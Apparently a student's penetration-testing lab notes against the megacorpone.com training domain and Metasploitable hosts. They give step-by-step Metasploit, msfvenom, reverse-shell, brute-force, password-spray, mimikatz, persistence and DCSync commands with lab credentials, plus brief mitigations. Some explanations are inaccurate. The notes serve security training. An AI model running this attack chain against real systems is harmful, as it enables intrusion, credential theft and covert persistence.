![[Indext of assets 1.jpg]]
site:megacorpone.com
- found set version 
	- Search for known vulnerability 
		- Copy Apache/2.4.38 and past into google as 
		- Apache/2.4.38 exploit 
			- There are known exploit 
		- Mitigate: You need to remove the Apache/2.4.378

![[targets.jpg]]
- We want to target Tanya Rivera 
	- Developer has access to the website information 
	- Mitigation: 
		- Do not include email or twitter information 
		- Note they are more likely to be target for phishing emails 
			- It is not a problem but give them training on what could be phishing emails 

![[Emails names address 2.jpg]]
at the email is normally; first initial: last name emails 
	- This will show who we can target 
	- Mitigation: 

![[exttxt1.jpg]]
site:megacorpone.com ext:txt

![[Nanites.jpg]]
https://www.megacorpone.com/nanites.php 
- Replace /robot -> /nanites.php 


NOTE: Use crt.sh
- this site is for certificate finger print for websites 

![[Vulnerability Shodan.jpg]]
- shodan screen shot 

To find this 
Go to CMD 

go to shodan sign in 

___
Recon-ng

![[Recon 1.jpg]]
vpn.megacorpone.com  address : 51.222.169.220
- Want to target this by using brute force 

NOTE: this is finding all domains under megacorpone.com 
- We want to target the VPN page 
	- We want to break into the site from a safe/ private location
- We also have the username and emails 

Name Email 
Joe Sheer joe@megacorpone.com
Tom Hudson thudson@megacorpone.com
Tanya Rivera trivera@megacorpone.com 
Matt Smith msmith@megacorpone.com
Mike Carlow mcarlow@megacorpone.com
Alan Grofield agrofield@megacorpone.com

Joe
Tom 
Tanya
Matt 
Mike
Alan

Use Burpsuite to brute force into the VPN 
![[Recon - VPn signin 1.jpg]]
- username Thudson 
- password Thudson 
Note: Thudson is base on 
- Tom Hudson from web designer 

Mitigation: 
- Never accept any username as passwords
- password should expire and can not use previous or any use passwords 


![[thudson assit.jpg]]
password.lst
- Has a list of passwords that we can use to brute force

VPN.sh 
- Downloaded to we can try to brute force into the the database of megacorpone


![[cat.Vpn 1 1.jpg]]
cat vpn.sh 

![[CHMODRunVPn.jpg]]
Made vpn.sh into an executable by CHMOD +x 
run; ./vpn.sh
this allows us to go into the vpn and scan network locally

____

![[ZenmapVPN 1.jpg]]
Using zenmap to scan internal network 
cmd on Kali 
- zenmap 

run ip a in a new terminal 
we want 172.22.117.100 
- This is our private address
	- We want this because we are in the VPN network and we want to scan local network 


___

![[ZenmapScan 1.jpg]]
in zenmap 
Target 172.22.117.0/24 and hit scan
- Note this is our Kali ip address (172.22.117.100)
	- We want to check other internal networks 
	- We are checking our own Ip because we are in the VPN system 
	- if you turn anything with a 0 at the end, it will scan all network 
	- his is scanning all target 
	- It is look for an vulnerability 
- Note we have 172.22.117.150 after the scan
	- This shows that there are available ports 

NOTE: This shows that the state is vulnerable (exploitable)

Mitigation: 
- update your vsftpd  2.3.4 

Creating a Geo location when running a VPN 
____
![[vsftpd2.3.4 exploit 1.jpg]]
- This is the site that you look up
- vsftpd 2.3.4 exploit on google 

![[CmdRemotemachine 1.jpg]]
Download the .py file from above 
- and ran python3 .py file (twice)

I was able to sign into the account 
- I can run command hostname
	- It gave me the host name: metasploitable 

Mitigation: 
- Update your machine 
- Monitor Geolocation for VPN 
- Monitor VPN 

___
From here we can create a reverse pwoer shell to enter your Computer turning the computers into zombies 
![[Power shell 1 1.jpg]]
googling Reverse power shell 
- ip and ports would be the our port 
- Listner would be a script that is run on potential zombie computers 
- Then below we create a revere power shell that is able to listen to any pings for us to connect to the server 

____
**Persistence** 
**THIS IS GETTING INTO THE USERNAME**
***Brute force VNC:*** 
$Search vnc login
$use 0
- this payload will have file called vnc_password.txt which has all the most common passwords for VNC 
$options 
- options will show what is required 
set RHOST 172.22.117.150
- RHOST to victim machine 
set USERNAME root 
- change user to root 
run 
![[16.3.0.10.jpg]]
- This worked 

then google
How to log into VNC from Kali 
- (if you have a username and password)
- Root/ password

$vncviewer 172.22.117.150
- this should work 

signing password = password

Results
![[16.3.0.11.jpg]]
- What would pop up is the VNC machine from Kali 
- and from here i can use the cmd to do anything 

mitigation: 
- Change passwords that is not common for VNC 
- 

____
**If a User that does not have root**
We will first set up a low-privileged shell using Metasploit, which you will then use for post-exploitation and privilege-escalation techniques.

1. In Metasploit, search for `distcc`, and select it
    - `search distcc`.
    - `use 0` or `use exploit/unix/misc/distcc_exec`.
    - `distcc` is a tool for compiling code. It runs as a daemon with low permissions, and this version is vulnerable.
2. List the options of the module, and note that we need to set RHOSTS again as it is a required option.
    - `set RHOSTS 172.22.117.150`

1. Before running the module, we need to set a payload. List the available payloads.
    - `show payloads`
    - Note the **Description** column, as it shows in parentheses how the payload is communicating.
    
1. Select the **reverse** payload. Be sure NOT to select **reverse_bash**, or the exploit will not work.
    - `set PAYLOAD cmd/unix/reverse`
    - Note that we are now using the PAYLOAD with our EXPLOIT!

1. List options again, and note that there's a new blank setting, LHOST. This is our "listening host," which is the host that listens for the payload communication. In this case, our LHOST is the machine that we're currently operating on. Use `ifconfig` to show your IP (eth0) and set LHOST to that IP.
    - `set LHOST 172.22.117.100`
2. Run the module.
    - `exploit` OR `run`
    
7. Check your current user via `id`.
    - `id`
    - Note that we were able to obtain a low-privileged shell with an exploit.
    - Leave the current window and Metasploit session open, as you will use it in the next activity

**We want to move from daemon to root**
![[txt files with password.jpg]]
NOTE:  now that you are able to sign into the ip address 172.22.117.150 as Daemon, we want to sign into root
1. We want too use find or grep command to look for admin, password, key, or secret 
	1.  $find / -type f -iname"[*] admin [*].txt" 
		- find: search for 
		- / : Starting from root 
		- -type f: Search for any files 
		- ["*]admin[*].txt" : search any text that has admin text 
			- NO []
	- if you add 2>/dev/null in the end 
		- This will remove all the permission deny noticed 
	- This step will help you find text file that  Daemon has permission to access 
		- /var/tmp/adminpassword.txt
			- The file name is adminpassword

	2. cat /var/tmp/adminpassword.txt
		- This will tell you msfadmin: cybersecurity 
			- msfadmin is the username  
			- cybersecurity is the password
![[Gang root.jpg]]
	3. In a new terminal you want to sign in as root 
		- The ip address that you want to attack 172.22.117.150
		- SSH msfadmin@172.22.117.150
			- SSH is to  sign into a user with their ip
		- password: cybersecurity 
SUDO -l 
- if it ihas the word (ALL)ALL
- You have sudo command
	- msfadmin should not have root 
- SUDO SI
	- You are root 

Mitigation: 
- We need to put 2 fact authorization 
- Do not give (ALL)ALL msfadmin 
	- limit sudo permission 

___
John with low to high privilege user
****NOTE: We want to steal other people's passwords 

ssh msfadmin@172.22.117.150 
- From previous class
password:cybersecurity
ls -l
- This shows your permission (ALL)ALL
cat /etc/shadow
- This shows users 

What users you want to target? 
- Group users under 1000
	- They are systems 
- ![[16.4.0.1.jpg]]
	- We want to target anyone that has /bin/bash and /bin/sh

ls /home 
- Anyone who can sign into the computer 
	- We wamt tp target user and tstark
		- They can sign into the computer

sudo cat /etc/shadow
- ![[16.4.0.2.jpg]]
	- We want to copy between the user:$ and : 
- ![[16.4.0.3.jpg]]
	- This is what you want to copy 

These are the other user we want in nano - Named hash.txt
![[16.4.0.4.jpg]]

We want to john ripper hash.txt file 
![[16.4.0.5.jpg]]
- This is what we found 

- Mitigation 
	- Use a better hashing algorithm
	- Longer and complex password 
___
**Port Vulnerability**
$nmap -sV -sC 172.22.117.0/24 -oA nmap -vv
- -sV: scan for verison 
- sC: Scan for certification 
- 172.22.117.0/24: Want to scan all the subnets which that port 
- rest: To save the results in a file 

Scan the subnet for live host, open ports, and vulnerability 
![[100.jpg]]
port 80 is open 
- It is telling you 
	- It is a website and what do you want to see what type of website 
	- We want to see if the website is horribly designed 

VNC is open as well 
Note: This is us which means it is usuless 

![[10.jpg]]
- kerberos is a domain controller 
	- A domain controller is a computer that can manage all other computers 
port 88 and 636 works together 

![[20.jpg]]
port 135, 139, 445, 3390 are open
- 135 and 139 are usually together 
- This tells you that there is nothing but they have a remote windows 

How many windows machine are on the network?
Two machines 
- 10 and 20 

We rescan the nmap and found another machine we can attack 

___
**Password spray**
Activity: password Spraying
Note: We are doing this because we already found their /etc/shadow/ already 

We are going to go into metasploit 
$msfconsole 

Now we are going to use the auxiltery scanner 
$use auxiliary/scanner/smb/smb_login
- We are scanning (for username and password to see if it successful)

Since we have tstark already from brute force activity 
$options
- We want to  see what we need to input 

set RHOST 172.22.117.0/24
- We are going to scan all network from tstark 
set SMBUser tstark
set SMBPASS Password!

Domain: megacorpone.local
set smbdomain megacorpone 

run 


We got 2 hits 
![[Brute force 1.jpg]]

![[smbattack.jpg]]
Mitigation: 
- Network Monitoring 
- password complex

go to WINDC01 Machine
try signing as 
tstark
Password!

Sign in locally
./tstark
password!

does not work so ./tstark does not work

try to sign into 
WINDC01 machine 

![[Unable to signin.jpg]]
Even though we were able to sign in through the SMB, we can not sign into the remotely 
- not able to sign in remote or local access 

____
Instructor Demo: WMI
msfconsole 
use auxiliary/scanner/smb/impacket/wmiexec
options
- command
	- set COMMAND whoami
- set smbdomain 
	- Megacorpone
- Rhosts
	- set RHOSTS 172.22.117.20
- smbuser
	- set smbuser tstark
- smbpass
	- Password!
![[whoami.jpg]]

![[Tasklist.jpg]]

![[Systeminfo.jpg]]
What version and build number of windows 
set command setinfo
Version 10.0.19042 build 
	- We can search for exploits for this windows

What processor architecture is the machine
set command setinfo
- x64
![[net session.jpg]]
Are there any users logged in?
set command net session 
- No
- Looks like only tstark

![[net share.jpg]]
What shares are available on the machine 
set command net share
- C (Default Share)
- IPC (Remote IPC)
- ADMIN$ (Remote Admin)
___
**Instructor demo: Custom Payload Creation with msfvenom**
Instructor demo: Custom Payload Creation with msfvenom
msfvenon -h 
- Tell you a options of msfvenom 

msfvenom -l payloads 
- List any payloads that we can generate 
	- Reverse_tcp 
- The type would be depending on the type you want to attack

msfvenom -l format 
- Type of files executable and transform format

shortcut-
revshells generator 
revshells.com 
- this will tell you how to generate 

bind vs a reverse shell 
Bind
- Initiated by the attacker's system listening for incoming connection on a specfic port 
- More complex tactics to establish and maintain 
Reverse 
- Initiated by victim's system receiving a command from the attacker's system

![[17.2.0.0.jpg]]
-p: type of payload 
reverse_tcp: Type of attack
LHOST: Listener 
LPORT: where to listen from 
-f: Type of file 
-o:
Note: this is the payload for msfvenom
![[17.2.0.1.jpg]]
-q quite mode
-x execute 
; helps you run multiple commands if it is not successful for not 
NOTE: This is what we want to listen from 

Create a new tab
$ smbclient //172.22.117.20/C$ -U megacorpone/tstark
- We want to connect to the subnetwork .20
	- Connect to their c$
	- C$ drive is like root 
- With megacorpone tstark 
	- The username: tstark
	- Passwrod: Password!

![[Put notavirus.jpg]]
Sharing files are HR, Management, etc.  
- This shows that we were able to put the virus into their account 

![[TstarkC$ 1.jpg]]
notavirus is in tstark c drive

![[metapreterTstark 2.jpg]]
Once we Tstark interact with the file 
- On his POV, Nothing will happen 
- on our POV, We are able to sign into meterpreter
	- If we run shell 
		- It will react as their window machine 
		- (We input whoami and resulted in Tstark)


![[Target5348.jpg]]
Run ps (powersell)
Migrate 6088
- sometimes it works sometimes it doesn't 
- We do not want to stay as 5352 because they can see if it is the hacker (So we can hide)
	- We can also run as a different ID 
	- Now we can run as svchost.exe
NOTE: It can be anyone that has Megacorpone/tstark

![[NoteOurID.jpg]]
Note: We are 4496 
- We are transferring to 6088
___


![[ls.jpg]]
Able to see the permissions for each files

![[UploadingMsfVenom.jpg]]
able to updload files 

![[Root FromTstark.jpg]]
We are able to become root from tstark 

![[sysinfomsfvenom.jpg]]
We can see the system info from the command 


![[Background session2.jpg]]
We were able to access session 2  
- When Tstark interact with notavirus

We are able to look at other sessions or anyone who interact with the virus 
- Then we can run cmds ask the infected computer 


____
Activity: Windows Privilege Escalation 
After running the msfvenom we are going to go to sessions 2 (to access tstark computer)
![[WindowsPrivEsca 1.jpg]]
$ run 
$ session 
$ background 
$ session 2 



![[payload privesca.jpg]]
$ Background
$ use exploit/windows/local/persistence_services
Refering this site 
https://www.rapid7.com/db/modules/exploit/windows/local/persistence_service/ 


![[sessions privesca.jpg]]
$ session
Note: LPORT 4444

use exploit/multi/handler
![[Multi.jpg]]
hit run (We are listening for people who are trying to run as administrator)

$ background
![[runasadmin.jpg]]
go to windows and righ click and run as administrator in tstark computer
- This will give us another meterpreter shell 
- If we run sessions, we can see another session that has run as administrator 

![[Privesca.jpg]]
go back to 
use exploit/windows/local/persistence_service
sessions
set session 3
set LHost 172.22.117.100
exploit 

![[Privesca1.jpg]]
running getuid
- this will tell us that we got from Tstark to SYSTEM

____
Instructor Demo: Windows Persistence
![[Schtask 1.jpg]]
We are able to create a schedule to run the command notavirus 

![[Schtask1 2.jpg]]
This shows that running the scheduled task was sucessful 

What were were missing was an listener but that can be run by; 
use exploit/multi/handler
sessions
set session 4
set LHost 172.22.117.100
exploit 

____
**Credentials stealing **

![[17.3.0.2.jpg]]
load kiwi (Minikatz)

using a priveexec session by loading mimikats (Kiwi)
- kiwi allows use to extract kiwi credential hashes 


![[17.3.0.3.jpg]]
running the kiwi_cmd lsadump::cahce
- We want to look for mscacheV2 from bbanner and pparker 

![[17.3.0.4.jpg]]
We were able to crack bbanner hash 

![[17.3.0.5.jpg]]
When signed in 
- We can see Bbanner



Mitigation:
- More complex password
- Password rotation 
- More Complex hashing programs

____


![[17.3.0.8.jpg]]
We are able to privesca by using lateral movement 

Mitigation:
Add ACL to important system
- ACL are Access control list 
	- This will on only allow certain people to sign in 

___
Activity: Lateral Movement
Go back to the first cmd 
back ground 
use exploit/windows/local/wmi
options

![[17.3.0.6.jpg]]
set RHOSTS 172.22.117.10`
set SESSION [ID of the active Meterpreter session running as SYSTEM]
- The SYSTEM was admin which was Tstark (Windows 10 - Tstark)
	- We will use the session 172.22.117.10
	- The session would be 1 
		- The reason why we set the session to 1 is because that is the machine we have access too
set SMBDomain megacorpone`
set SMBUser bbanner`
set SMBPass Winter2021`
set LHOST 172.22.117.100

![[17.3.0.7.jpg]]
Note This will create a new session (2)
- Sysinfo
	- We are login WINDC01
- getuid
	- We are sign into bbanner 
![[17.3.0.8.jpg]]
We are able to privesca by using lateral movement 

Mitigation:
Add ACL to important system
- ACL are Access control list 
	- This will on only allow certain people to sign in 


____
DCSYNC
$ Session 
- We want to go to session 2 (back to metapreter)
	- we know that Bbanner is in metapreter
$ Session -i 2 
- -i: Interact 
	- We should have this because we want to enter -i2
$ shell
- WE want to run as SYSTEM

$ net user 
- We want to see a list of users 

$ exit 
- We want to go back to meterpreter 

$ load kiwi
- Using program to do an credential attack
- 
![[Hashed passwords.jpg]]
$ dcsync_ntlm cdanvers

$ john hash.txt --format=NT -show
![[Cdanvers.jpg]]
____
